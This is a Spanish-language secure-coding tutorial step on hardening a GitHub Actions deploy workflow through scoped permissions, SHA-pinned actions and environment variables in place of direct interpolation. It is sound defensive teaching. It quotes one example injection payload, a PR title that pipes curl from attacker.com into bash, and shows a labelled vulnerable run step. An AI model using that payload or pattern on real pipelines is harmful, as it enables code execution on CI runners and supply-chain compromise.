# Paso 8. Seguridad en pipelines de CI/CD — permisos de workflow, tokens y supply chain

## Objetivo de aprendizaje

Entender que los pipelines de CI/CD son una superficie de ataque critica en el ciclo de desarrollo, por que los workflows de GitHub Actions con permisos excesivos y acciones de terceros sin version fija representan un riesgo de supply chain, y como aplicar el principio de minimo privilegio en la configuracion de los pipelines.

## Por que importa esto

El pipeline de CI/CD tiene acceso a secretos de produccion, puede desplegar codigo directamente y puede modificar el repositorio. Si el pipeline es comprometido (a traves de una accion de terceros maliciosa, un workflow que permite inyeccion de comandos o un token con demasiados permisos), el atacante tiene acceso directo a la cadena de suministro de software de la organizacion.

Los ataques de supply chain mas sofisticados de los ultimos anos han apuntado exactamente a este vector: comprometer una herramienta de CI/CD o una accion de GitHub para inyectar codigo malicioso en el software que esa herramienta construye y despliega.

## Que vas a cambiar y por que

En este paso vas a trabajar sobre `src/pipeline/.github/workflows/deploy.yml`. El workflow tiene `permissions: write-all`, usa acciones de terceros sin version fija (solo con tag `@v1`), y tiene un paso que usa directamente `${{ github.event.pull_request.title }}` en un comando shell (inyeccion de comandos via titulo de PR).

## Archivo y seccion que debes modificar

- Archivo objetivo: `src/pipeline/.github/workflows/deploy.yml`
- Permisos del workflow: deben ser especificos por scope
- Referencias a acciones: deben usar el commit SHA en lugar del tag
- Uso de inputs en comandos shell: debe sanitizarse o evitarse

## Cambio base recomendado

Permisos minimos por scope:

```yaml
# SEGURO: permisos especificos solo para lo que el workflow necesita
permissions:
  contents: read
  id-token: write   # Solo si usa OIDC para autenticacion en cloud
  # pull-requests: write   # Solo si necesita comentar en PRs
```

Fijar acciones al commit SHA:

```yaml
# SEGURO: commit SHA completo — los tags son mutables y pueden ser reemplazados
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Evitar inyeccion de comandos:

```yaml
# VULNERABLE: el titulo de la PR va directamente a un comando shell
- run: echo "Deploying ${{ github.event.pull_request.title }}"

# SEGURO: usar variable de entorno para desconectar el valor del codigo shell
- run: echo "Deploying $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

## Que te esta enseñando este cambio

- `permissions: write-all` o la ausencia de la clave `permissions` dan al token `GITHUB_TOKEN` permisos de lectura y escritura en todo el repositorio. Eso significa que si el workflow es comprometido, el atacante puede modificar el codigo, las releases y los packages del repositorio.
- Los tags de acciones de GitHub (`@v1`, `@main`) son mutables: el propietario de la accion puede cambiar a que commit apuntan en cualquier momento. Un commit SHA es inmutable. Fijar al SHA garantiza que siempre se ejecuta exactamente el codigo que has revisado.
- La inyeccion de comandos en GitHub Actions ocurre cuando un valor controlado por el usuario (titulo de PR, nombre de rama, mensaje de commit) se interpola directamente en un comando `run`. Un atacante puede crear una PR con titulo `"; curl attacker.com/payload | bash; echo "` y ejecutar codigo arbitrario en el runner.
- Usar `env:` para pasar valores a comandos shell convierte el valor en una variable de entorno que el shell no interpreta como parte de la sintaxis del comando, igual que los parametros en sentencias SQL preparadas.

## Como adaptarlo correctamente

- Usa el principio de separacion de privilegios: divide los workflows en jobs con diferentes permisos. El job de build no necesita permisos de escritura; el job de deploy si.
- Audita regularmente las acciones de terceros que usas: verifica que el mantenedor es activo y que el repositorio de la accion tiene buenas practicas de seguridad.
- Configura `CODEOWNERS` para los archivos de workflow: cualquier cambio en `.github/workflows/` debe ser aprobado por alguien con autoridad para modificar los pipelines.
- Usa ambientes de GitHub (Environments) para los deployments a produccion: requieren aprobacion manual y limitan que secrets estan disponibles en cada ambiente.

## Que deberia verse al terminar

- `deploy.yml` tiene la clave `permissions` con scopes especificos, sin `write-all`.
- Las acciones usan el formato `@COMMIT_SHA` en lugar de solo `@tag`.
- Los valores de `github.event.pull_request.*` o inputs similares se pasan via `env:` en lugar de interpolarse directamente en comandos `run`.

## Que valida el workflow automaticamente

- `scripts/validate-step-08.py` comprueba que `src/pipeline/.github/workflows/deploy.yml` contiene los marcadores.
- El validador busca la clave `permissions` con scopes especificos.
- El validador verifica que no existe `write-all` en permisos.
- El validador busca el uso de `env:` para pasar variables a comandos shell.

## Criterio de finalizacion

El paso 8 queda completado cuando el workflow de GitHub Actions valida este cambio sin errores.
